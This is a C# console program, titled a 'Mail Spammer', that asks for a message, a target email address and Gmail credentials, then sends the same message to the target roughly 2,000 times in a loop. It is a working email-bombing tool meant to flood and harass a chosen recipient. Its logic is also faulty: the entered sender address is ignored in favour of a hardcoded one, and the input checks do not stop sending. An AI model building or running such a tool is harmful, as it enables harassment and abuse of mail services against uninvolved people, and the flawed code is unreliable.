using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace AspN
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Mail Spammer - Made By Rasmus 2011";
            Console.ForegroundColor = ConsoleColor.Green;

            ScrollPrint(" _____       _        _____        _____                       \n", 10);
            ScrollPrint("|     |___ _| |___   | __  |_ _   | __  |___ ___ _____ _ _ ___ \n", 10);
            ScrollPrint("| | | | .'| . | -_|  | __ -| | |  |    -| .'|_ -|     | | |_ -|\n", 10);
            ScrollPrint("|_|_|_|__,|___|___|  |_____|_  |  |__|__|__,|___|_|_|_|___|___|\n", 10);
            ScrollPrint("                           |___|                               \n", 10);
            ScrollPrint(" ___ ___ ___   ___   \n", 10);
            ScrollPrint("|_  |   |_  | |_  |  \n", 10);
            ScrollPrint("|  _| | |_| |_ _| |_ \n", 10);
            ScrollPrint("|___|___|_____|_____|\n\n", 10);

            ScrollPrint("▐▀░░░░░░░░▀▌\n", 10);
            ScrollPrint("▐░▐▀▌░░▐▀▌░▌\n", 10);
            ScrollPrint("▐░░░░░░░░░░▌\n", 10);
            ScrollPrint("▐░░▀▄░░▄▀░░▌\n", 10);
            ScrollPrint("▐▄░░░▀▀░░░▄▌\n\n", 10);
            Thread.Sleep(1000);

            ScrollPrint("Message: ", 25);
            string mailMessage = Console.ReadLine();
            Thread.Sleep(100);
            ScrollPrint("Target Email: ", 25);
            string mailTarget = Console.ReadLine();
            Thread.Sleep(100);
            ScrollPrint("Your Email: ", 25);
            string myEmail = Console.ReadLine();
            Thread.Sleep(100);
            ScrollPrint("Your Password: ", 25);
            string myPassword = Console.ReadLine();
            Thread.Sleep(100);

            if(mailMessage == "")
            {
                ScrollPrint("Write a message, please.", 25);
                Thread.Sleep(50);
            }
            else if(mailTarget == "")
            {
                ScrollPrint("Write a target, please.", 25);
                Thread.Sleep(50);
            }
            else if(myEmail == "")
            {
                ScrollPrint("Write your email adress, please.", 25);
                Thread.Sleep(50);
            }
            else if(myPassword == "")
            {
                ScrollPrint("Write your password, please.", 25);
                Thread.Sleep(50);
            }
                var fromAddress = new MailAddress("c4b3ry@gmail.com", "c4b3ry was here");
                var toAddress = new MailAddress(mailTarget, "@_@");
                string fromPassword = myPassword;
                const string subject = "c4b3ry@gmail.com";
                string body = string.Format(mailMessage);

                var smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body
                })
                {
                    for (int ii = 0; ii <= 500; ii++)
                    {
                       smtp.Send(message);
                       smtp.Send(message);
                       smtp.Send(message);
                       smtp.Send(message);
                       ScrollPrint(ii + " :D\n", 25);
                       Thread.Sleep(10);
                    }
                }
        }

        private static void ScrollPrint(string text, int speed)
        {
            foreach (char c in text)
            {
                Console.Write(c);
                Thread.Sleep(speed);
            }
        }
    }
}
